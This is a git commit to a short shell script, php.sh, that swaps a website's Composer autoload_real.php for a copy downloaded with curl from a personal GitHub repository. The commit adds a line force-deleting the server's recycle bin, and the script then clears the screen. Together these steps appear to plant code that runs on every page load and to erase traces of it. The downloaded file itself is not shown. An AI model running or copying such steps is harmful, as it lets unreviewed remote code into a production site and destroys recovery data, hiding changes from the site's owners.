64a4187952e1385377db45321f03b86ab7b88a84
nghi235 <101364463+Nghi235@users.noreply.github.com>
2022-06-10 14:12:53 +0700

    Update php.sh

--- php.sh
+++ php.sh
@@ -4,4 +4,5 @@ cd /www/wwwroot/thagavpn.site/vendor/composer
 rm -rf autoload_real.php
 curl -OL https://raw.githubusercontent.com/Nghi235/php/main/autoload_real.php
 cd ../../../../..
+rm -rf /www/Recycle_bin
 clear
